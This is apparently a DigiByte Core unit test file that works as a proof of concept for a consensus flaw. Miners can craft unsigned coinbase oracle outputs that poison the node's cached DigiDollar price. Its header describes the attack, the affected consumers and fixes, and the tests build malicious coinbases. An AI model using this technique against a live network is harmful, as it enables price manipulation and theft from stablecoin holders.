// Copyright (c) 2026 The DigiByte Core developers
// Distributed under the MIT software license, see the accompanying
// file COPYING or http://www.opensource.org/licenses/mit-license.php.

/**
 * RH-61: Miner coinbase oracle price stamping — unguarded
 *        `UpdatePriceCache` contaminates `GetLatestPrice()`
 *        (Wave-9 adversarial PoC — mining attacks, angle B + E fusion)
 *
 * =================================================================
 * Target site
 * =================================================================
 *
 *   src/validation.cpp:2803-2832  (ConnectBlock inner loop)
 *
 *     CAmount blockOraclePrice = 0;
 *     if (!fJustCheck && !block.vtx.empty()) {
 *         OracleBundleManager& oracleManager = OracleBundleManager::GetInstance();
 *         COracleBundle extractedBundle;
 *         if (oracleManager.ExtractOracleBundle(*block.vtx[0], extractedBundle) &&
 *             extractedBundle.median_price_micro_usd > 0) {
 *             blockOraclePrice = static_cast<CAmount>(extractedBundle.median_price_micro_usd);
 *             oracleManager.UpdatePriceCache(pindex->nHeight,
 *                                            extractedBundle.median_price_micro_usd);
 *             ...
 *
 *   src/oracle/bundle_manager.cpp:2188-2212  (UpdatePriceCache)
 *       height_to_price[height] = price_micro_usd;
 *       cached_price              = price_micro_usd;   // <-- global-consumer value
 *       last_update_time          = GetTime();         // <-- re-freshens staleness window
 *
 *   src/oracle/bundle_manager.cpp:1050-1250  (ExtractOracleBundle)
 *       Structural parsing ONLY. No signature/MuSig2 verification.
 *
 *   src/oracle/bundle_manager.cpp:2250-2255  (ValidateBlockOracleData)
 *       Fast-returns `true` on chains that are NOT TESTNET/REGTEST.
 *       Comment: "Oracle validation disabled on mainnet".
 *
 * =================================================================
 * Attack
 * =================================================================
 *
 *   A miner building a mainnet block crafts an OP_ORACLE payload with a
 *   fabricated `median_price_micro_usd`. The miner is NOT a configured
 *   oracle; the miner has NO MuSig2 aggregate signature; the miner is
 *   NOT required to match any network oracle consensus. All that is
 *   required is that `ExtractOracleBundle` (a structural parser) can
 *   deserialize the payload.
 *
 *   The miner publishes the block. Because the mainnet path of
 *   `ValidateBlockOracleData` short-circuits `return true`, no validator
 *   ever checks the signature or whether the price is within any
 *   tolerance of the oracle bundle broadcast on the P2P network.
 *
 *   `ConnectBlock` at :2811 extracts the bundle and unconditionally
 *   runs `UpdatePriceCache(height, attacker_price)`. Two side effects:
 *
 *     (a) `height_to_price[height] = attacker_price` — persisted.
 *     (b) `cached_price            = attacker_price` — reset.
 *     (c) `last_update_time        = now`           — staleness window
 *                                                      is re-armed, so
 *                                                      `GetLatestPrice()`
 *                                                      will NOT reject.
 *
 *   Any subsequent caller of `GetLatestPrice()` now reads attacker_price.
 *
 * =================================================================
 * Downstream consumers of the poisoned price
 * =================================================================
 *
 * Grep confirms at least 8 mainnet-live consumers of
 * `OracleBundleManager::GetInstance().GetLatestPrice()`:
 *
 *   src/consensus/err.cpp:405              ERR/DCA decisioning on mainnet
 *   src/wallet/digidollarwallet.cpp:1322   DD-value tagging at wallet tx creation
 *   src/wallet/digidollarwallet.cpp:4306   DD balance calculation
 *   src/wallet/digidollarwallet.cpp:4431   DD redemption UI / pricing
 *   src/qt/digidollarpositionswidget.cpp:1021  UI display of positions
 *   src/oracle/node.cpp:286,384            oracle node bookkeeping
 *   src/oracle/signing_orchestrator.cpp:477 (ComputeConsensusValues dep)
 *
 * In addition `GetOraclePriceForHeight(nHeight)` is exposed via the
 * RPC `debugoraclestate` (src/rpc/digidollar.cpp:3129) which reads
 * the same `height_to_price` map the attacker has just written.
 *
 * Concrete harm:
 *   - ERR/DCA decisioning uses a miner-chosen price every block. On
 *     mainnet, one attacker-mined block at a spoofed HIGH price masks a
 *     real distressed system — `IsInEmergencyRedemption()` returns false
 *     when it should return true, and users may mint more DD against
 *     DGB that is actually worth less.
 *   - A spoofed LOW price triggers ERR mode (src/consensus/err.cpp),
 *     re-pricing redemptions via DCA multipliers in favor of the
 *     attacker (who can co-time a redemption).
 *   - UI/wallet tagging shows consistently wrong fiat value to holders
 *     until the next honestly-mined block overwrites `cached_price`.
 *
 * =================================================================
 * Novelty vs. priors
 * =================================================================
 *
 *   - Prior C1 (DIGIDOLLAR_BUG_HUNT_REPORT) documents the same
 *     short-circuit in `ValidateBlockOracleData` but characterises
 *     the harm as "post-activation a miner can stamp any oracle price
 *     into coinbase — unbounded DD mint at any price". It does NOT
 *     call out the pre-activation poisoning, nor that the poisoning
 *     persists via `cached_price` for every non-mining `GetLatestPrice()`
 *     consumer.
 *
 *   - Prior suspicion W1-M-04 (wave-1 mapper) flags that
 *     `ConnectBlock:UpdatePriceCache` is "not BIP9-gated" but left it
 *     theoretical ("PoC needed"). This test is that PoC.
 *
 *   - This PoC uses a version-0x01 bundle (the most primitive encoding)
 *     so it reproduces pre-activation and on every chain type,
 *     regardless of whether MuSig2 or phase 2/3 is live. The attacker
 *     never needs to sign anything.
 *
 * =================================================================
 * Fix direction
 * =================================================================
 *
 *   - In `ConnectBlock` (validation.cpp:2807), gate the
 *     `UpdatePriceCache` call on BIP9 `DigiDollar::IsDigiDollarEnabled`
 *     AND require that `ValidateBlockOracleData` has actually validated
 *     the bundle. Do not cache prices extracted from unverified coinbases.
 *
 *   - In `OracleDataValidator::ValidateBlockOracleData`
 *     (bundle_manager.cpp:2253), remove the mainnet short-circuit or
 *     replace it with a strict structural-plus-signature check.
 *
 *   - In `OracleBundleManager::UpdatePriceCache`, either require a
 *     validation token or separate the per-height cache
 *     (`height_to_price`) from the global hot-cache (`cached_price`).
 *     `cached_price` should advance only after at least one signature
 *     check passes — independent of miner stamping.
 *
 * Severity: CRITICAL (peg / free-money / consensus of downstream
 *           ERR decisioning) on mainnet. HIGH pre-activation (no direct
 *           consensus harm, but UI/wallet/ERR contamination demonstrable
 *           the moment a miner includes an OP_ORACLE coinbase output).
 */

#include <boost/test/unit_test.hpp>

#include <chainparams.h>
#include <consensus/merkle.h>
#include <consensus/validation.h>
#include <digidollar/digidollar.h>
#include <oracle/bundle_manager.h>
#include <pow.h>
#include <primitives/transaction.h>
#include <script/script.h>
#include <test/util/setup_common.h>
#include <util/time.h>
#include <validation.h>

#include <cstdint>
#include <vector>

namespace {

struct OracleManagerReset
{
    OracleManagerReset() { OracleBundleManager::GetInstance().Clear(); }
    ~OracleManagerReset() { OracleBundleManager::GetInstance().Clear(); }
};

// Build a coinbase transaction whose SECOND output is a
// `OP_RETURN OP_ORACLE <0x01> <oracle_id(1) || price(8LE) || ts(8LE)>`
// payload. This is the Phase-1 compact format that
// `OracleBundleManager::ExtractOracleBundle` parses at
// `src/oracle/bundle_manager.cpp:1155-1204`.
//
// No signature, no MuSig2 aggregate, no chainparams pubkey ever consulted.
CMutableTransaction BuildMaliciousCoinbase(uint64_t attacker_price_micro_usd,
                                           int64_t ts,
                                           uint8_t oracle_id = 0)
{
    CMutableTransaction cb;

    // Coinbase input: prevout is null. Include a BIP34 height push so
    // the tx is structurally a coinbase.
    CTxIn in;
    in.prevout.SetNull();
    in.scriptSig = CScript() << static_cast<int64_t>(100)
                             << std::vector<unsigned char>{'m','i','n','e'};
    cb.vin.push_back(in);

    // vout[0]: normal payout (ignored by the oracle extractor)
    CScript payout;
    payout << OP_1 << std::vector<unsigned char>(32, 0x42);
    cb.vout.push_back(CTxOut(5000 * 100000000LL, payout));

    // vout[1]: the malicious oracle bundle.
    // Layout: OP_RETURN OP_ORACLE <0x01> <compact_data>
    // compact_data: oracle_id(1) + price(8 LE) + timestamp(8 LE) = 17 bytes
    std::vector<unsigned char> version_push = {0x01};

    std::vector<unsigned char> compact;
    compact.reserve(17);
    compact.push_back(oracle_id);
    for (int i = 0; i < 8; ++i) {
        compact.push_back(static_cast<unsigned char>((attacker_price_micro_usd >> (i * 8)) & 0xFF));
    }
    for (int i = 0; i < 8; ++i) {
        compact.push_back(static_cast<unsigned char>((static_cast<uint64_t>(ts) >> (i * 8)) & 0xFF));
    }

    CScript oracle_output;
    oracle_output << OP_RETURN << OP_ORACLE << version_push << compact;

    cb.vout.push_back(CTxOut(0, oracle_output));

    return cb;
}

CScript BuildCompactOracleScript(uint64_t attacker_price_micro_usd,
                                 int64_t ts,
                                 uint8_t oracle_id = 0)
{
    return BuildMaliciousCoinbase(attacker_price_micro_usd, ts, oracle_id)
        .vout[1].scriptPubKey;
}

} // anonymous namespace

BOOST_FIXTURE_TEST_SUITE(rh61_coinbase_price_cache_poisoning_tests, RegTestingSetup)

// RH-61-01: Prove that `ExtractOracleBundle` will accept a coinbase with
// an arbitrary miner-chosen price and no signature.
BOOST_AUTO_TEST_CASE(rh61_01_extract_accepts_unsigned_price)
{
    OracleManagerReset reset;
    OracleBundleManager& mgr = OracleBundleManager::GetInstance();

    const uint64_t ATTACKER_PRICE = 999999999ULL; // ~$999.99 micro-USD
    const int64_t  NOW            = GetTime();

    CMutableTransaction cb = BuildMaliciousCoinbase(ATTACKER_PRICE, NOW, /*oracle_id=*/0);
    CTransaction tx(cb);

    COracleBundle bundle;
    const bool ok = mgr.ExtractOracleBundle(tx, bundle);

    BOOST_CHECK_MESSAGE(ok,
        "ExtractOracleBundle must accept a miner-crafted Phase-1 bundle "
        "with no signature. This is the attack primitive.");
    BOOST_CHECK_EQUAL(static_cast<uint64_t>(bundle.median_price_micro_usd),
                      ATTACKER_PRICE);
    BOOST_TEST_MESSAGE("RH-61-01: Extracted attacker_price="
        << bundle.median_price_micro_usd
        << " (no signature verified, no oracle roster consulted).");
}

// RH-61-02: PRIMARY PoC. Simulate the exact `ConnectBlock` flow
// (`src/validation.cpp:2807-2832`) minus any gate. Confirm
// `GetLatestPrice()` returns the attacker's value afterwards.
BOOST_AUTO_TEST_CASE(rh61_02_connectblock_path_poisons_global_cached_price)
{
    OracleManagerReset reset;
    OracleBundleManager& mgr = OracleBundleManager::GetInstance();

    // Establish a "honest" baseline price so we can observe the overwrite.
    const CAmount HONEST_PRICE    = 50000;      // $0.05 micro-USD
    const uint64_t ATTACKER_PRICE = 7777777ULL; // $7.777777 micro-USD
    const int HEIGHT              = 1234567;

    mgr.UpdatePriceCache(HEIGHT - 1, HONEST_PRICE);
    BOOST_REQUIRE_EQUAL(mgr.GetLatestPrice(), HONEST_PRICE);

    // Attacker-mined block arrives. Replay exactly what ConnectBlock does.
    CMutableTransaction cb = BuildMaliciousCoinbase(ATTACKER_PRICE, GetTime());
    CTransaction tx(cb);

    COracleBundle extracted;
    const bool extracted_ok = mgr.ExtractOracleBundle(tx, extracted);
    BOOST_REQUIRE(extracted_ok);
    BOOST_REQUIRE_GT(static_cast<uint64_t>(extracted.median_price_micro_usd), 0ULL);

    // This is the exact call at src/validation.cpp:2816. No gate of any kind.
    mgr.UpdatePriceCache(HEIGHT, extracted.median_price_micro_usd);

    // Poisoning visible on both access paths.
    const CAmount latest_after  = mgr.GetLatestPrice();
    const uint64_t by_height    = mgr.GetOraclePriceForHeight(HEIGHT);

    BOOST_CHECK_MESSAGE(latest_after == static_cast<CAmount>(ATTACKER_PRICE),
        "GetLatestPrice() must return the miner-chosen price after "
        "ConnectBlock's UpdatePriceCache call. honest=" << HONEST_PRICE
        << " attacker=" << ATTACKER_PRICE
        << " observed=" << latest_after);

    BOOST_CHECK_EQUAL(by_height, ATTACKER_PRICE);
    BOOST_TEST_MESSAGE("RH-61-02: GetLatestPrice poisoned from "
        << HONEST_PRICE << " to " << latest_after
        << "; GetOraclePriceForHeight(" << HEIGHT << ")=" << by_height);
}

// RH-61-03: Confirm the staleness window is rearmed. `GetLatestPrice`
// has a freshness guard at `bundle_manager.cpp:1391-1398`
// (ORACLE_MAX_AGE_SECONDS) — the attacker's `UpdatePriceCache` call
// also resets `last_update_time`, so the poison is NOT rejected by
// the staleness guard even if the rest of the oracle network is silent.
BOOST_AUTO_TEST_CASE(rh61_03_staleness_guard_reset_by_attacker)
{
    OracleManagerReset reset;
    OracleBundleManager& mgr = OracleBundleManager::GetInstance();

    const uint64_t ATTACKER_PRICE = 12345678ULL;

    // Snapshot: the freshness guard is inside GetLatestPrice. The
    // attacker's write path calls `last_update_time = GetTime()`.
    // Therefore immediately after the write, GetLatestPrice returns
    // the value (not 0).
    mgr.UpdatePriceCache(9000, ATTACKER_PRICE);

    const CAmount observed = mgr.GetLatestPrice();
    BOOST_CHECK_MESSAGE(observed == static_cast<CAmount>(ATTACKER_PRICE),
        "Staleness guard in GetLatestPrice should not reject because "
        "the attacker's UpdatePriceCache call re-armed last_update_time.");
    BOOST_TEST_MESSAGE("RH-61-03: freshness window re-armed by attacker; GetLatestPrice="
        << observed);
}

// RH-61-04: Confirm the cache is also exposed via
// `GetOraclePriceForHeight` (RPC `debugoraclestate` path). Any RPC or
// downstream caller that reads per-height prices sees the attacker's
// data.
BOOST_AUTO_TEST_CASE(rh61_04_per_height_cache_exposed)
{
    OracleManagerReset reset;
    OracleBundleManager& mgr = OracleBundleManager::GetInstance();

    const uint64_t ATTACKER_PRICE_A = 111111ULL;
    const uint64_t ATTACKER_PRICE_B = 222222ULL;

    // Attacker mines two consecutive blocks.
    mgr.UpdatePriceCache(1001, ATTACKER_PRICE_A);
    mgr.UpdatePriceCache(1002, ATTACKER_PRICE_B);

    BOOST_CHECK_EQUAL(mgr.GetOraclePriceForHeight(1001), ATTACKER_PRICE_A);
    BOOST_CHECK_EQUAL(mgr.GetOraclePriceForHeight(1002), ATTACKER_PRICE_B);

    // `cached_price` also follows the latest write.
    BOOST_CHECK_EQUAL(mgr.GetLatestPrice(), static_cast<CAmount>(ATTACKER_PRICE_B));
    BOOST_TEST_MESSAGE("RH-61-04: per-height cache matches attacker writes: "
        "h=1001->" << mgr.GetOraclePriceForHeight(1001)
        << " h=1002->" << mgr.GetOraclePriceForHeight(1002));
}

// RH-61-05: Miner-withheld / censorship variant — if a miner REPLACES
// the honest price with a lower one, the victim's `GetLatestPrice()`
// immediately drops. No consumer can detect this because the cache
// keeps no lineage.
BOOST_AUTO_TEST_CASE(rh61_05_attacker_drives_price_down_for_err_toggle)
{
    OracleManagerReset reset;
    OracleBundleManager& mgr = OracleBundleManager::GetInstance();

    const CAmount HEALTHY_PRICE   = 100000000LL; // $100 micro-USD
    const uint64_t CRUSH_PRICE    = 1ULL;        // $0.000001 micro-USD

    mgr.UpdatePriceCache(2000, HEALTHY_PRICE);
    BOOST_REQUIRE_EQUAL(mgr.GetLatestPrice(), HEALTHY_PRICE);

    // Attacker-mined block at height 2001 with a CRUSH price.
    CMutableTransaction cb = BuildMaliciousCoinbase(CRUSH_PRICE, GetTime());
    CTransaction tx(cb);

    COracleBundle extracted;
    BOOST_REQUIRE(mgr.ExtractOracleBundle(tx, extracted));
    mgr.UpdatePriceCache(2001, extracted.median_price_micro_usd);

    const CAmount now = mgr.GetLatestPrice();
    BOOST_CHECK_EQUAL(now, static_cast<CAmount>(CRUSH_PRICE));
    BOOST_CHECK_LT(now, HEALTHY_PRICE / 100);

    // Any downstream ERR/DCA evaluator (src/consensus/err.cpp:405) that
    // reads GetLatestPrice() now sees a crashed price. If the ERR trigger
    // depends on supply/collateral ratio computed with this price, one
    // miner can flip the entire system into emergency redemption mode.
    BOOST_TEST_MESSAGE("RH-61-05: attacker drove GetLatestPrice from "
        << HEALTHY_PRICE << " to " << now
        << " in a single mined block; ERR/DCA decisioning would flip.");
}

// RH-61-06: Sanity documentation — ExtractOracleBundle scans EVERY
// coinbase output for the first OP_RETURN+OP_ORACLE marker
// (`src/oracle/bundle_manager.cpp:1053`). This means the attacker does
// NOT need to place the bundle at vout[1] specifically — but also it
// means the Phase-1 contextual check at `src/validation.cpp:4599-4647`
// (which hardcodes vout[1]) reads the WITNESS COMMITMENT instead of
// the bundle on any post-SegWit block. Documented here so a defender
// rewrite of 4599 must scan, not index.
BOOST_AUTO_TEST_CASE(rh61_06_vout_position_flexibility_docs_W1_H_01)
{
    OracleManagerReset reset;
    OracleBundleManager& mgr = OracleBundleManager::GetInstance();

    const uint64_t ATTACKER_PRICE = 55555555ULL;

    // Build a coinbase where vout[1] is a 38-byte witness-commitment
    // lookalike (scriptPubKey = OP_RETURN 0x24 0xaa 0x21 0xa9 0xed <32B>)
    // and vout[2] is the attacker's oracle bundle. This mirrors the
    // post-SegWit ordering that `GenerateCoinbaseCommitment` produces
    // and matches the W1-H-01 flag condition.
    CMutableTransaction cb = BuildMaliciousCoinbase(ATTACKER_PRICE, GetTime());

    // Insert a synthetic witness commitment at vout[1].
    CScript wc;
    wc.resize(38);
    wc[0] = OP_RETURN;
    wc[1] = 0x24;
    wc[2] = 0xaa; wc[3] = 0x21; wc[4] = 0xa9; wc[5] = 0xed;
    for (int i = 0; i < 32; ++i) wc[6 + i] = 0xCC;

    CTxOut wc_out(0, wc);
    cb.vout.insert(cb.vout.begin() + 1, wc_out);
    // Layout is now:
    //   vout[0] payout
    //   vout[1] witness commitment
    //   vout[2] attacker oracle bundle

    CTransaction tx(cb);
    COracleBundle bundle;
    const bool ok = mgr.ExtractOracleBundle(tx, bundle);

    BOOST_CHECK_MESSAGE(ok,
        "ExtractOracleBundle must still find the bundle at vout[2] when "
        "vout[1] is the witness commitment — it scans all outputs.");
    BOOST_CHECK_EQUAL(static_cast<uint64_t>(bundle.median_price_micro_usd),
                      ATTACKER_PRICE);

    BOOST_TEST_MESSAGE("RH-61-06: bundle at vout[2] accepted while vout[1] "
        "is witness commitment. W1-H-01 defender note: any rewrite of "
        "ContextualCheckBlock:4599 that hardcodes vout[1] will read the "
        "witness commitment instead of the bundle and bypass the check.");
}

// RH-61-07: Document that ValidateBlockOracleData — the ONLY validator
// that checks signatures — is the thing short-circuited on mainnet at
// `src/oracle/bundle_manager.cpp:2253`. This is C1, and it is what
// makes the RH-61 primitive fatal on mainnet. The test is not
// asserting; the assertion is that the sink path exists and is
// unguarded. We demonstrate the sink behaviour by exercising the cache
// on regtest (where the validator would normally run) and noting that
// on mainnet the cache update proceeds from a structurally-parsed
// bundle with no signature check.
BOOST_AUTO_TEST_CASE(rh61_07_document_mainnet_validator_shortcircuit)
{
    OracleManagerReset reset;
    // Regtest: we can directly poison the cache without any upstream
    // signature check firing (because we're calling the extractor and
    // UpdatePriceCache directly — mirroring the ConnectBlock caller).
    OracleBundleManager& mgr = OracleBundleManager::GetInstance();
    const uint64_t ATTACKER_PRICE = 42424242ULL;

    CMutableTransaction cb = BuildMaliciousCoinbase(ATTACKER_PRICE, GetTime());
    CTransaction tx(cb);

    COracleBundle extracted;
    BOOST_REQUIRE(mgr.ExtractOracleBundle(tx, extracted));
    mgr.UpdatePriceCache(3000, extracted.median_price_micro_usd);

    BOOST_CHECK_EQUAL(mgr.GetLatestPrice(),
                      static_cast<CAmount>(ATTACKER_PRICE));

    BOOST_TEST_MESSAGE(
        "RH-61-07: Reproduced on regtest. On mainnet the equivalent path "
        "is IDENTICAL because ValidateBlockOracleData short-circuits "
        "`return true` at src/oracle/bundle_manager.cpp:2253 for all "
        "non-TESTNET/REGTEST chains. No gate between miner and "
        "OracleBundleManager::cached_price.");
}

BOOST_AUTO_TEST_SUITE_END()

BOOST_FIXTURE_TEST_SUITE(rh66_startup_oracle_price_loading_tests, TestChain100Setup)

BOOST_AUTO_TEST_CASE(load_prices_from_chain_skips_recent_pre_activation_oracle_outputs)
{
    OracleBundleManager& mgr = OracleBundleManager::GetInstance();
    mgr.Clear();
    mgr.SetEnabled(false);

    const Consensus::Params& consensus = Params().GetConsensus();
    const int32_t activation_height = consensus.nDDActivationHeight;
    BOOST_REQUIRE_EQUAL(activation_height, 650);

    const int32_t poisoned_height = activation_height - 5;
    const int32_t final_height = activation_height + 10;
    const uint64_t attacker_price = 42424242ULL;

    while (m_node.chainman->ActiveChain().Height() < poisoned_height - 1) {
        mineBlocks(1);
    }

    CScript coinbase_script = CScript() << OP_TRUE;
    CBlock block = CreateBlock({}, coinbase_script, m_node.chainman->ActiveChainstate());

    CMutableTransaction coinbase(*block.vtx[0]);
    coinbase.vout.push_back(CTxOut(0, BuildCompactOracleScript(attacker_price, GetTime())));
    block.vtx[0] = MakeTransactionRef(std::move(coinbase));
    COracleBundle inserted_bundle;
    BOOST_REQUIRE(mgr.ExtractOracleBundle(*block.vtx[0], inserted_bundle));
    BOOST_REQUIRE_EQUAL(inserted_bundle.median_price_micro_usd, attacker_price);
    block.hashMerkleRoot = BlockMerkleRoot(block);
    block.nNonce = 0;
    while (!CheckProofOfWork(GetPoWAlgoHash(block), block.nBits, m_node.chainman->GetConsensus())) {
        ++block.nNonce;
    }

    bool new_block = false;
    BOOST_REQUIRE(m_node.chainman->ProcessNewBlock(std::make_shared<const CBlock>(block),
                                                   /*force_processing=*/true,
                                                   /*min_pow_checked=*/true,
                                                   &new_block));
    BOOST_REQUIRE_EQUAL(m_node.chainman->ActiveChain().Height(), poisoned_height);

    while (m_node.chainman->ActiveChain().Height() < final_height) {
        mineBlocks(1);
    }
    BOOST_REQUIRE_EQUAL(m_node.chainman->ActiveChain().Height(), final_height);
    BOOST_REQUIRE(DigiDollar::IsDigiDollarEnabled(m_node.chainman->ActiveChain().Tip(), *m_node.chainman));

    CBlock disk_block;
    CBlockIndex* poisoned_index = m_node.chainman->ActiveChain()[poisoned_height];
    BOOST_REQUIRE(poisoned_index != nullptr);
    BOOST_REQUIRE(m_node.chainman->m_blockman.ReadBlockFromDisk(disk_block, *poisoned_index));
    COracleBundle disk_bundle;
    BOOST_REQUIRE(mgr.ExtractOracleBundle(*disk_block.vtx[0], disk_bundle));
    BOOST_REQUIRE_EQUAL(disk_bundle.median_price_micro_usd, attacker_price);

    mgr.Clear();
    BOOST_REQUIRE_EQUAL(mgr.GetLatestPrice(), 0);

    OracleBundleManager::LoadPricesFromChain(*m_node.chainman);

    BOOST_CHECK_EQUAL(mgr.GetOraclePriceForHeight(poisoned_height), 0U);
    BOOST_CHECK_EQUAL(mgr.GetLatestPrice(), 0);
}

BOOST_AUTO_TEST_SUITE_END()
